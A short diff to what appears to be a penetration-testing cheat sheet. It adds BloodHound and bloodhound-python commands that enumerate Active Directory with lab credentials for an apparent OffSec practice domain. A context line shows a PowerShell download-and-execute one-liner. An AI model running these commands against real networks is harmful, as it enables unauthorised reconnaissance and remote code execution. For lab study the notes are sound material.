@@ -162,6 +162,14 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('ht
 use post/windows/gather/bloodhound       
 ```
 
+### Bloodhound-python
+
+```
+sudo neo4j console
+bloodhound
+bloodhound-python -u enox -p california -ns $ip -d heist.offsec -c all
+```
+
 #### Custom Queries
 
 ```
